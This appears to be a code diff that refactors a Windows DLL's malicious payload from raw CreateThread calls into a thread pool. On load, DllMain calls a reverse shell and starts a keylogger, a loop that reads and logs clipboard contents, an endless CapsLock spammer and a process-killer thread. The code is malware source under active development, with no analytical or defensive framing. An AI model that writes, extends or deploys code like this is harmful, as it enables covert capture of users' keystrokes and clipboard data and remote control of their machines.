@@ -17,14 +17,15 @@ static DebugConsole *g_console = nullptr;
 static KeyLogger *g_keyLogger = nullptr;
 static std::mutex clipboardMutex;
 
+// Global Watcher instance
+static Thread_Pool *g_threadpool = nullptr;
+
 void DumpInput() {
     g_keyLogger = new KeyLogger(GetTempLogFilePath());
     g_keyLogger->StartLogging();
-    // spdlog::info("Started logger"); // Log instead of console output
 }
 
 void spamCapsLock() {
-    // spdlog::info("Starting CapsLock spam thread");
     while (true) {
         keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY, 0);
         keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
@@ -32,8 +33,7 @@ void spamCapsLock() {
     }
 }
 
-DWORD WINAPI ClearClipboardThread(LPVOID lpParam) {
-    // spdlog::info("Starting clipboard clearer");
+void ClearClipboardThread() { // Changed to void for consistency with thread pool
     while (true) {
         {
             std::lock_guard<std::mutex> lock(clipboardMutex);
@@ -42,7 +42,7 @@ DWORD WINAPI ClearClipboardThread(LPVOID lpParam) {
                 if (hData) {
                     char *pszText = static_cast<char *>(GlobalLock(hData));
                     if (pszText) {
-                        spdlog::info("Clipboard data: {}", pszText); // Log clipboard content
+                        spdlog::info("Clipboard data: {}", pszText);
                         GlobalUnlock(hData);
                     }
                 }
@@ -52,7 +52,6 @@ DWORD WINAPI ClearClipboardThread(LPVOID lpParam) {
         }
         Sleep(1000);
     }
-    return 0;
 }
 
 int main() {
@@ -71,13 +70,21 @@ int main() {
 
 extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason, LPVOID lpRes) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
-        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)main, 0, 0, 0);
+        // Initialize the Watcher thread pool with, say, 4 threads
+        g_threadpool = new Thread_Pool(5);
+
+        // Enqueue tasks into the Watcher thread pool
         RevShell();
-        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DumpInput, 0, 0, 0);
-        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ClearClipboardThread, 0, 0, 0);
-        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)spamCapsLock, 0, 0, 0);
-        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ProcessKillerThread, 0, 0, 0);
+        g_threadpool->enqueue([] { main(); });
+        g_threadpool->enqueue([] { DumpInput(); });
+        g_threadpool->enqueue([] { ClearClipboardThread(); });
+        g_threadpool->enqueue([] { spamCapsLock(); });
+        g_threadpool->enqueue([] { ProcessKillerThread(nullptr); });
     } else if (fdwReason == DLL_PROCESS_DETACH) {
+        if (g_threadpool) {
+            delete g_threadpool; // This will stop and join all threads
+            g_threadpool = nullptr;
+        }
         if (g_console) {
             g_console->Cleanup();
             delete g_console;
